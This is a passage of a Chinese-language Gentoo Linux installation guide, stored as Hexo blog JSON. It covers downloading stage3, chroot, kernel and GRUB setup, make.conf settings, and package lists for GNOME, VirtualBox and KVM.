id=\"4-1-包管理\"><a href=\"#4-1-包管理\" class=\"headerlink\" title=\"4.1 包管理\"></a>4.1 包管理</h2><h3 id=\"4-1-1-app-portage-x2F-eix\"><a href=\"#4-1-1-app-portage-x2F-eix\" class=\"headerlink\" title=\"4.1.1 app-portage&#x2F;eix\"></a>4.1.1 app-portage&#x2F;eix</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-portage/eix<br>app-portage/gentoolkit<br>app-portage/layman<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-文件系统\"><a href=\"#4-2-文件系统\" class=\"headerlink\" title=\"4.2 文件系统\"></a>4.2 文件系统</h2><h3 id=\"4-2-1-sys-fs-x2F-lvm2\"><a href=\"#4-2-1-sys-fs-x2F-lvm2\" class=\"headerlink\" title=\"4.2.1 sys-fs&#x2F;lvm2\"></a>4.2.1 sys-fs&#x2F;lvm2</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sys-fs/lvm2<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-2-2-ntfs\"><a href=\"#4-2-2-ntfs\" class=\"headerlink\" title=\"4.2.2 ntfs\"></a>4.2.2 ntfs</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sys-fs/ntfs3g<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-3-DE\"><a href=\"#4-3-DE\" class=\"headerlink\" title=\"4.3 DE\"></a>4.3 DE</h2><h3 id=\"4-3-1-gnome\"><a href=\"#4-3-1-gnome\" class=\"headerlink\" title=\"4.3.1 gnome\"></a>4.3.1 gnome</h3><blockquote>\n<p>一定要有swap分区，否则编译不会通过<br>make。conf 中 MAKEOPTS&#x3D;”-j4” 此条不存在编译也会失败</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">gnome-base/gnome<br>gnome-base/gconf<br>gnome-extra/gnome-tweaks<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-4-vitual\"><a href=\"#4-4-vitual\" class=\"headerlink\" title=\"4.4 vitual\"></a>4.4 vitual</h2><h3 id=\"4-4-1-virtualbox\"><a href=\"#4-4-1-virtualbox\" class=\"headerlink\" title=\"4.4.1 virtualbox\"></a>4.4.1 virtualbox</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/virtualbox<br>app-emulation/virtualbox-additions<br>app-emulation/virtualbox-extpack-oracle<br>app-emulation/virtualbox-modules<br>app-emulation/virtualbox-guest-additions  <span class=\"hljs-comment\"># gentoo虚拟机安装</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-4-2-kvm\"><a href=\"#4-4-2-kvm\" class=\"headerlink\" title=\"4.4.2 kvm\"></a>4.4.2 kvm</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class=\"hljs-built_in\">enable</span> libvirtd<br>systemctl <span class=\"hljs-built_in\">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure>\n\n\n<h1 id=\"5-系统迁移\"><a href=\"#5-系统迁移\" class=\"headerlink\" title=\"5 系统迁移\"></a>5 系统迁移</h1><h2 id=\"5-1-权限备份与恢复\"><a href=\"#5-1-权限备份与恢复\" class=\"headerlink\" title=\"5.1 权限备份与恢复\"></a>5.1 权限备份与恢复</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">getfacl -R ./ &gt; acl.txt<br>setfacl --restore=acl.txt<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"5-2-用户组\"><a href=\"#5-2-用户组\" class=\"headerlink\" title=\"5.2 用户组\"></a>5.2 用户组</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gcode\">用户id=<span class=\"hljs-number\">1001</span><span class=\"hljs-comment\">(miloo)</span> 组id=<span class=\"hljs-number\">100</span><span class=\"hljs-comment\">(users)</span> 组=<span class=\"hljs-number\">100</span><span class=\"hljs-comment\">(users)</span>,<span class=\"hljs-number\">10</span><span class=\"hljs-comment\">(wheel)</span>,<span class=\"hljs-number\">11</span><span class=\"hljs-comment\">(floppy)</span>,<span class=\"hljs-number\">18</span><span class=\"hljs-comment\">(audio)</span>,<span class=\"hljs-number\">19</span><span class=\"hljs-comment\">(cdrom)</span>,<span class=\"hljs-number\">27</span><span class=\"hljs-comment\">(video)</span>,<span class=\"hljs-number\">85</span><span class=\"hljs-comment\">(usb)</span>,<span class=\"hljs-number\">78</span><span class=\"hljs-comment\">(kvm)</span>,<span class=\"hljs-number\">272</span><span class=\"hljs-comment\">(plugdev)</span>,<span class=\"hljs-number\">172</span><span class=\"hljs-comment\">(pulse-access)</span>,<span class=\"hljs-number\">304</span><span class=\"hljs-comment\">(vboxusers)</span>,<span class=\"hljs-number\">79</span><span class=\"hljs-comment\">(libvirt)</span><br></code></pre></td></tr></table></figure>\n","site":{"data":{}},"wordcount":8037,"more":"<ul>\n<li><a href=\"#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\">1 准备工作</a><ul>\n<li><a href=\"#11-%E4%B8%8B%E8%BD%BD\">1.1 下载</a></li>\n<li><a href=\"#12-%E7%BD%91%E7%BB%9C\">1.2 网络</a></li>\n<li><a href=\"#13-%E5%88%86%E5%8C%BA%E6%8C%82%E8%BD%BD\">1.3 分区挂载</a></li>\n<li><a href=\"#14-ssh%E8%BF%9E%E6%8E%A5%E6%9C%80%E5%B0%8F%E5%8C%96%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F\">1.4 ssh连接最小化安装系统</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%AE%89%E8%A3%85\">2 安装</a><ul>\n<li><a href=\"#21-%E8%A7%A3%E5%8E%8B%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F\">2.1 解压基本系统</a></li>\n<li><a href=\"#22-%E9%95%9C%E5%83%8F%E6%BA%90%E4%B8%8Echroot\">2.2 镜像源与chroot</a></li>\n<li><a href=\"#23-portage%E4%BB%93%E5%BA%93\">2.3 portage仓库</a></li>\n<li><a href=\"#24-profile%E9%80%89%E6%8B%A9\">2.4 profile选择</a></li>\n<li><a href=\"#25-%E5%AE%89%E8%A3%85%E5%86%85%E6%A0%B8%E5%9B%BA%E4%BB%B6\">2.5 安装内核、固件</a></li>\n<li><a href=\"#26-%E9%85%8D%E7%BD%AE%E5%BC%95%E5%AF%BC\">2.6 配置引导</a></li>\n<li><a href=\"#27-%E6%97%B6%E5%8C%BA%E5%AD%97%E7%AC%A6%E9%9B%86%E9%85%8D%E7%BD%AE\">2.7 时区、字符集配置</a></li>\n<li><a href=\"#28-virtualbox-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE\">2.8 virtualbox 虚拟机配置</a></li>\n</ul>\n</li>\n<li><a href=\"#3-use\">3 USE</a><ul>\n<li><a href=\"#31-makeconf\">3.1 make.conf</a></li>\n<li><a href=\"#32-use\">3.2 USE</a></li>\n</ul>\n</li>\n<li><a href=\"#4-tools\">4 tools</a><ul>\n<li><a href=\"#41-%E5%8C%85%E7%AE%A1%E7%90%86\">4.1 包管理</a><ul>\n<li><a href=\"#411-app-portageeix\">4.1.1 app-portage&#x2F;eix</a></li>\n</ul>\n</li>\n<li><a href=\"#42-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F\">4.2 文件系统</a><ul>\n<li><a href=\"#421-sys-fslvm2\">4.2.1 sys-fs&#x2F;lvm2</a></li>\n<li><a href=\"#422-ntfs\">4.2.2 ntfs</a></li>\n</ul>\n</li>\n<li><a href=\"#43-de\">4.3 DE</a><ul>\n<li><a href=\"#431-gnome\">4.3.1 gnome</a></li>\n</ul>\n</li>\n<li><a href=\"#44-vitual\">4.4 vitual</a><ul>\n<li><a href=\"#441-virtualbox\">4.4.1 virtualbox</a></li>\n<li><a href=\"#442-kvm\">4.4.2 kvm</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#5-%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB\">5 系统迁移</a><ul>\n<li><a href=\"#51-%E6%9D%83%E9%99%90%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D\">5.1 权限备份与恢复</a></li>\n<li><a href=\"#52-%E7%94%A8%E6%88%B7%E7%BB%84\">5.2 用户组</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1 准备工作\"></a>1 准备工作</h1><h2 id=\"1-1-下载\"><a href=\"#1-1-下载\" class=\"headerlink\" title=\"1.1 下载\"></a>1.1 下载</h2><ul>\n<li><p>下载<a href=\"https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/\">最小化安装镜像</a>, 名称为: <code>install-amd64-minimal-&#123;日期&#125;.iso</code>  </p>\n</li>\n<li><p>下载<a href=\"https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/\">合适的stage3</a>,以日期为路径: <code>20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</code></p>\n</li>\n</ul>\n<h2 id=\"1-2-网络\"><a href=\"#1-2-网络\" class=\"headerlink\" title=\"1.2 网络\"></a>1.2 网络</h2><p>&amp;emsp;&amp;emsp;基操忽略</p>\n<h2 id=\"1-3-分区挂载\"><a href=\"#1-3-分区挂载\" class=\"headerlink\" title=\"1.3 分区挂载\"></a>1.3 分区挂载</h2><p>&amp;emsp;&amp;emsp;基操忽略</p>\n<h2 id=\"1-4-ssh连接最小化安装系统\"><a href=\"#1-4-ssh连接最小化安装系统\" class=\"headerlink\" title=\"1.4 ssh连接最小化安装系统\"></a>1.4 ssh连接最小化安装系统</h2><p>&amp;emsp;&amp;emsp;编辑 <code>sshd</code> 服务配置文件 <code>/etc/ssh/sshd_config</code>, 重启服务 <code>rc-server sshd restart</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">PermitRootLogin <span class=\"hljs-built_in\">yes</span><br>PasswordAuthentication <span class=\"hljs-built_in\">yes</span><br></code></pre></td></tr></table></figure>\n<h1 id=\"2-安装\"><a href=\"#2-安装\" class=\"headerlink\" title=\"2 安装\"></a>2 安装</h1><h2 id=\"2-1-解压基本系统\"><a href=\"#2-1-解压基本系统\" class=\"headerlink\" title=\"2.1 解压基本系统\"></a>2.1 解压基本系统</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">livecd ~ <span class=\"hljs-comment\"># blkid</span><br>/dev/sdb: UUID=<span class=\"hljs-string\">&quot;e09609d8-0b90-4f34-aad1-8e5b37495f52&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;4096&quot;</span> TYPE=<span class=\"hljs-string\">&quot;ext4&quot;</span><br>/dev/sr0: BLOCK_SIZE=<span class=\"hljs-string\">&quot;2048&quot;</span> UUID=<span class=\"hljs-string\">&quot;2022-07-03-19-01-40-00&quot;</span> LABEL=<span class=\"hljs-string\">&quot;Gentoo amd64 20220703T170542Z&quot;</span> TYPE=<span class=\"hljs-string\">&quot;iso9660&quot;</span> PTUUID=<span class=\"hljs-string\">&quot;5e426e6b&quot;</span> PTTYPE=<span class=\"hljs-string\">&quot;dos&quot;</span><br>loop0: TYPE=<span class=\"hljs-string\">&quot;squashfs&quot;</span><br>/dev/sda2: UUID=<span class=\"hljs-string\">&quot;14077ead-3683-4354-95eb-a106c52350e9&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;4096&quot;</span> TYPE=<span class=\"hljs-string\">&quot;ext4&quot;</span> PARTUUID=<span class=\"hljs-string\">&quot;4af31142-0ead-0644-b34c-c01b7c0944e1&quot;</span><br>/dev/sda1: UUID=<span class=\"hljs-string\">&quot;831A-6EDD&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;512&quot;</span> TYPE=<span class=\"hljs-string\">&quot;vfat&quot;</span> PARTUUID=<span class=\"hljs-string\">&quot;733a54ad-b3d7-3842-8cc8-21b15d29e82d&quot;</span><br>livecd ~ <span class=\"hljs-comment\"># mount /dev/sda2 /mnt/gentoo/</span><br>livecd ~ <span class=\"hljs-comment\"># mkdir /mnt/gentoo/boot</span><br>livecd ~ <span class=\"hljs-comment\"># mount /dev/sda1 /mnt/gentoo/boot</span><br>livecd ~ <span class=\"hljs-comment\"># cd /mnt/gentoo/</span><br>livecd /mnt/gentoo <span class=\"hljs-comment\"># ls</span><br>boot  lost+found<br>livecd /mnt/gentoo <span class=\"hljs-comment\"># wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</span><br>--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  <br>Resolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840<br>Connecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 516402028 (492M) [application/octet-stream]<br>Saving to: ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’<br>stage3-amd64-desktop-systemd- 100%[=================================================&gt;] 492.48M  11.3MB/s    <span class=\"hljs-keyword\">in</span> 46s<br>2022-07-05 08:10:40 (10.6 MB/s) - ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’ saved [516402028/516402028]<br>livecd /mnt/gentoo <span class=\"hljs-comment\"># tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include=&#x27;*.*&#x27; --numeric-owner</span><br>……<br></code></pre></td></tr></table></figure>\n<h2 id=\"2-2-镜像源与chroot\"><a href=\"#2-2-镜像源与chroot\" class=\"headerlink\" title=\"2.2 镜像源与chroot\"></a>2.2 镜像源与chroot</h2><p>&amp;emsp;&amp;emsp;配置一个速度较快的镜像源服务器地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">mirrorselect -i -o &gt;&gt;/mnt/gentoo/etc/portage/make.conf  <span class=\"hljs-comment\"># 选择163和清华大学源</span><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;GENTOO_MIRRORS=&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo&quot;&#x27;</span> &gt;&gt;/mnt/gentoo/etc/portage/make.conf<br><span class=\"hljs-comment\"># chroot 到目标系统</span><br><span class=\"hljs-comment\"># 复制 DNS 配置到目标系统环境</span><br><span class=\"hljs-built_in\">cp</span> -L /etc/resolv.conf /mnt/gentoo/etc/<br><span class=\"hljs-comment\"># 挂载必要的文件系统</span><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br><span class=\"hljs-comment\"># systemd stage3 额外执行</span><br>mount --make-rslave /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/dev<br><span class=\"hljs-comment\"># chroot 到目标系统环境</span><br><span class=\"hljs-built_in\">chroot</span> /mnt/gentoo<br><span class=\"hljs-comment\"># 导入环境信息</span><br>. /etc/profile<br><span class=\"hljs-comment\"># 修改提示符以便于区分</span><br>PS1=(<span class=\"hljs-built_in\">chroot</span>)<span class=\"hljs-variable\">$PS1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-portage仓库\"><a href=\"#2-3-portage仓库\" class=\"headerlink\" title=\"2.3 portage仓库\"></a>2.3 portage仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 仓库信息打包下载到本地</span><br>emerge-webrsync<br><span class=\"hljs-comment\"># 安装 vim</span><br>emerge -ask app-editors/vim<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-profile选择\"><a href=\"#2-4-profile选择\" class=\"headerlink\" title=\"2.4 profile选择\"></a>2.4 profile选择</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># eselect profile list</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># eselect profile set 7</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask --verbose --update --deep --newuse @world</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-5-安装内核、固件\"><a href=\"#2-5-安装内核、固件\" class=\"headerlink\" title=\"2.5 安装内核、固件\"></a>2.5 安装内核、固件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask gentoo-kernel  </span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask linux-firmware</span><br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-6-配置引导\"><a href=\"#2-6-配置引导\" class=\"headerlink\" title=\"2.6 配置引导\"></a>2.6 配置引导</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask grub</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo</span><br>Installing <span class=\"hljs-keyword\">for</span> x86_64-efi platform.<br>Installation finished. No error reported.<br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-install --target=x86_64-efi --efi-directory=/boot --removable</span><br>Installing <span class=\"hljs-keyword\">for</span> x86_64-efi platform.<br>Installation finished. No error reported.  <br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-mkconfig -o /boot/grub/grub.cfg</span><br>Generating grub configuration file ...<br>Found linux image: /boot/vmlinuz-5.15.48-gentoo-dist<br>Found initrd image: /boot/initramfs-5.15.48-gentoo-dist.img<br>Warning: os-prober will not be executed to detect other bootable partitions.<br>Systems on them will not be added to the GRUB boot configuration.<br>Check GRUB_DISABLE_OS_PROBER documentation entry.<br>Adding boot menu entry <span class=\"hljs-keyword\">for</span> UEFI Firmware Settings ...<br><span class=\"hljs-keyword\">done</span>        <br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-7-时区、字符集配置\"><a href=\"#2-7-时区、字符集配置\" class=\"headerlink\" title=\"2.7 时区、字符集配置\"></a>2.7 时区、字符集配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;Asia/Shanghai&#x27;</span> &gt; /etc/timezone<br><span class=\"hljs-built_in\">rm</span> /etc/localtime<br>emerge --config sys-libs/timezone-data<br>vim /etc/locale.gen<br>locale-gen<br><br><span class=\"hljs-built_in\">dd</span> <span class=\"hljs-keyword\">if</span>=/dev/zero of=/swapfile bs=1M count=8192 status=progress<br><span class=\"hljs-built_in\">chmod</span> 600 /swapfile<br>mkswap /swapfile<br>swapon /swapfile<br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;/swapfile               none    swap    defaults        0 0&quot;</span> &gt;&gt; /etc/fstab<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-8-virtualbox-虚拟机配置\"><a href=\"#2-8-virtualbox-虚拟机配置\" class=\"headerlink\" title=\"2.8 virtualbox 虚拟机配置\"></a>2.8 virtualbox 虚拟机配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 新建用户</span><br>useradd -m -g wheel -G usb,<span class=\"hljs-built_in\">users</span>,audio -s /bin/bash -N miloo<br><br><span class=\"hljs-comment\"># 如果是虚拟机需要添加到以下两个组</span><br>gpasswd -a miloo vboxguest<br>gpasswd -a miloo vboxsf<br><br><span class=\"hljs-comment\"># virtualbox 虚拟机安装后操作</span><br>emerge --ask app-emulation/virtualbox-guest-additions<br>systemctl <span class=\"hljs-built_in\">enable</span> --now virtualbox-guest-additions<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-USE\"><a href=\"#3-USE\" class=\"headerlink\" title=\"3 USE\"></a>3 USE</h1><h2 id=\"3-1-make-conf\"><a href=\"#3-1-make-conf\" class=\"headerlink\" title=\"3.1 make.conf\"></a>3.1 make.conf</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># These settings were set by the catalyst build script that automatically</span><br><span class=\"hljs-comment\"># built this stage.</span><br><span class=\"hljs-comment\"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class=\"hljs-comment\"># detailed example.</span><br>COMMON_FLAGS=<span class=\"hljs-string\">&quot;-march=native -O2 -pipe&quot;</span><br>CFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>CXXFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FCFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>MAKEOPTS=<span class=\"hljs-string\">&quot;-j25&quot;</span><br><br><span class=\"hljs-comment\"># <span class=\"hljs-doctag\">NOTE:</span> This stage was built with the bindist Use flag enabled</span><br>PORTDIR=<span class=\"hljs-string\">&quot;/var/db/repos/gentoo&quot;</span><br>DISTDIR=<span class=\"hljs-string\">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class=\"hljs-string\">&quot;/var/cache/binpkgs&quot;</span><br><br><span class=\"hljs-comment\"># This sets the language of build output to English.</span><br><span class=\"hljs-comment\"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br><br><span class=\"hljs-comment\"># mirrors</span><br>GENTOO_MIRRORS=<span class=\"hljs-string\">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br>ACCEPT_LICENSE=<span class=\"hljs-string\">&quot;*&quot;</span><br>ACCEPT_KEYWORDS=<span class=\"hljs-string\">&quot;amd64&quot;</span><br>AUTO_CLEAN=<span class=\"hljs-string\">&quot;yes&quot;</span><br><br><span class=\"hljs-comment\"># aria</span><br>FETCHCOMMAND=<span class=\"hljs-string\">&quot;/usr/bin/aria2c -d \\$&#123;DISTDIR&#125; -o \\$&#123;FILE&#125; --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \\$&#123;URI&#125;&quot;</span><br>RESUMECOMMAND=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;FETCHCOMMAND&#125;</span>&quot;</span><br><br><span class=\"hljs-comment\"># ccache</span><br>FEATURES=<span class=\"hljs-string\">&quot;ccache -test&quot;</span><br>CCACHE_DIR=<span class=\"hljs-string\">&quot;/var/cache/ccache&quot;</span><br><br><span class=\"hljs-comment\"># GRUB</span><br>GRUB_PLATFORMS=<span class=\"hljs-string\">&quot;efi-64&quot;</span><br><br><span class=\"hljs-comment\"># 